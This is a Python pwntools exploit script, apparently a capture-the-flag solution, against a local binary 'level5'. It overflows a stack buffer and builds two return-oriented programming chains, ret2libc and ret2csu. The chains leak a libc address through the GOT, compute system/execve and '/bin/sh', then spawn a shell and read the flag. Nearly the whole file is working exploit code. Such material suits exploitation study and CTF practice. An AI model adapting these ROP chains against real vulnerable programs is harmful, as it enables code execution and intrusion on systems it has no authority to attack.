from pwn import *

p = process('./ret2csu/level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('./ret2csu/level5')


def fun_ret2libc():
    ret = 0x0000000000400419
    pop_rdi = 0x0000000000400623
    pop_rsi_r15 = 0x0000000000400621
    write_plt = elf.plt['write']
    read_got = elf.got['read']
    main_addr = elf.sym['main']

    payload1 = b'a' * 136 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(read_got) \
               + p64(0) + p64(write_plt) + p64(main_addr)
    p.recvuntil(b'Hello, World\n')
    p.sendline(payload1)

    read_addr = u64(p.recvuntil(b'\x7f').ljust(8, b'\00'))
    print(hex(read_addr))

    base_addr = read_addr - libc.symbols['read']
    system_addr = base_addr + libc.symbols['system']
    binsh_addr = base_addr + next(libc.search(b'/bin/sh'))

    payload2 = b'a' * 136 + p64(ret) + p64(pop_rdi) + p64(binsh_addr) + p64(system_addr)
    p.recvuntil(b'Hello, World\n')
    p.sendline(payload2)

    p.sendline(b'cat flag')
    p.interactive()


def csu(addr, arg1, arg2, arg3, ret_addr):
    """
        0x00400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j
        0x00400600                 mov     rdx, r13
        0x00400603                 mov     rsi, r14
        0x00400606                 mov     edi, r15d
        0x00400609                 call    ds:(__frame_dummy_init_array_entry - 600E10h)[r12+rbx*8]
        0x0040060D                 add     rbx, 1
        0x00400611                 cmp     rbx, rbp
        0x00400614                 jnz     short loc_400600
        0x00400616
        0x00400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j
        0x00400616                 add     rsp, 8
        0x0040061A                 pop     rbx
        0x0040061B                 pop     rbp
        0x0040061C                 pop     r12
        0x0040061E                 pop     r13
        0x00400620                 pop     r14
        0x00400622                 pop     r15
        0x00400624                 retn
    """
    libc_csu_init_pop_ret = 0x0040061A  # pop     rbx
    libc_csu_init_call_r12 = 0x00400600  # mov     rdx, r13
    payload = flat([
        b'A' * 128,
        p64(0xdeadbeef),
        p64(libc_csu_init_pop_ret),
        p64(0),  # rbx
        p64(1),  # rbp
        p64(addr),  # r12
        p64(arg3),  # r13 -> rdx
        p64(arg2),  # r14 -> rsi
        p64(arg1),  # r15 -> edi
        p64(libc_csu_init_call_r12),
        b'A' * 56,  # pop * 6 + 'add     rsp, 8'    ->  6 * 8 + 8
        p64(ret_addr)
    ])
    return payload


def fun_ret2csu():
    write_got = elf.got['write']
    read_got = elf.got['read']
    main_addr = elf.sym['main']
    bss_addr = elf.bss()
    payload1 = csu(write_got, 1, read_got, 8, main_addr)

    p.recvuntil(b'Hello, World\n')
    p.sendline(payload1)

    read_addr = u64(p.recvuntil(b'\x7f').ljust(8, b'\00'))
    print(hex(read_addr))

    payload2 = csu(read_got, 0, bss_addr, 0x10, main_addr)

    p.recvuntil(b'Hello, World\n')
    p.send(payload2)

    base_addr = read_addr - libc.symbols['read']
    system_addr = base_addr + libc.symbols['system']
    execve_addr = base_addr + libc.symbols['execve']
    shellcode = p64(execve_addr) + b'/bin/sh\0'

    p.send(shellcode)

    payload3 = csu(bss_addr, bss_addr + 8, 0, 0, main_addr)

    p.recvuntil(b'Hello, World\n')
    p.send(payload3)

    p.sendline(b'cat flag')
    p.interactive()


if __name__ == '__main__':
    # fun_ret2csu()
    fun_ret2libc()
